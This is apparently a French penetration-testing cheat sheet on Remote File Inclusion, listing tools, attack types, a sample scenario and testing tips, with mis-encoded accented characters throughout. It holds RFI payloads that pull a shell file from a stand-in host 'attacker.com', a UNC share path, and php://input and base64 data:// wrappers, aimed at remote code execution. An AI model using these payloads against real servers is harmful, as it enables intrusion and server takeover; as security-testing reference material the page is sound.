
## ğŸŒ RFI (Remote File Inclusion)

---

## Introduction

Le <span class="concept">RFI</span> permet Ã  un attaquant dâ€™inclure un fichier distant dans une application vulnÃ©rable.

Elle peut permettre :
- ExÃ©cution de code distant (RCE)
- DÃ©ploiement de backdoor
- ContrÃ´le complet du serveur

Souvent combinÃ©e avec :
- LFI â†’ RFI chained
- XSS â†’ RCE indirect
- Upload vulnÃ©rable

---

## Objectifs

- <span class="goal">Identifier des vecteurs RFI</span>
- <span class="goal">Inclure un fichier malicieux</span>
- <span class="goal">Obtenir un RCE / shell</span>

---

## Outils & commandes

| Outil | Exemple & explication |
|-------|-----------------------|
| <span class="technology">Burp Suite (Repeater)</span> | Injection manuelle |
| <span class="technology">ffuf</span> | <span class="example">ffuf -u target?file=FUZZ -w rfi.txt</span> |
| <span class="technology">wfuzz</span> | Fuzz avancÃ© |
| <span class="technology">PayloadsAllTheThings</span> | Cheatsheet |
| <span class="technology">bbot</span> | Recon |
| <span class="technology">dnslog.cn</span> | DÃ©tection RFI Blind |

---

## Types de RFI

| Type | Exemple |
|------|---------|
| <span class="concept">Basic RFI</span> | `?page=http://attacker.com/shell.txt` |
| <span class="concept">Chained RFI</span> | LFI â†’ local wrapper include |
| <span class="concept">RFI via upload</span> | Upload + include |
| <span class="concept">RFI Blind</span> | DÃ©tectÃ© par DNS callback |
| <span class="concept">RFI + LFI + XSS</span> | Chaines hybrides |

---

## Techniques clÃ©s

| Technique | Outil |
|-----------|------|
| <span class="concept">Manual injection</span> | Burp |
| <span class="concept">Automated fuzz</span> | ffuf, wfuzz |
| <span class="concept">Blind detection</span> | dnslog.cn |
| <span class="concept">Bypass filters</span> | Manual |
| <span class="concept">Chained LFI â†’ RFI</span> | Manual |

---

## Payloads courants

```
http://attacker.com/shell.txt
\\attacker\share
../../../../attacker.com/shell
php://input
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
```

---

## Bonnes pratiques

- <span class="best-practice">Documenter les chemins vulnÃ©rables</span>
- <span class="best-practice">VÃ©rifier le contexte (GET, POST, JSON)</span>
- <span class="best-practice">Limiter le bruit en prod (fuzz slow mode)</span>
- <span class="best-practice">Tester les blind RFI</span>
- <span class="mitigation">Ne pas utiliser de payload destructif</span>

---

## ğŸ¯ Exemple de scÃ©nario

> <span class="note">ğŸŒ Cible :</span> Web app PHP vulnÃ©rable

Actions :
- <span class="technology">ffuf</span> â†’ dÃ©couverte param `page`
- <span class="technology">Burp Repeater</span> â†’ test `http://attacker.com/shell.txt`
- Reverse shell confirmÃ©
- LFI â†’ RFI via wrapper `php://filter`
- Rapport avec POC complet

---

## Cheatlist RFI

| Type | Outils |
|------|--------|
| Manual | Burp, PayloadsAllTheThings |
| Automated | ffuf, wfuzz |
| Blind | dnslog.cn |
| Chained | Manual |

---

## ğŸš€ Navigation

- ğŸš€ [[08_IDOR]]
- ğŸš€ [[09_SSRF]]
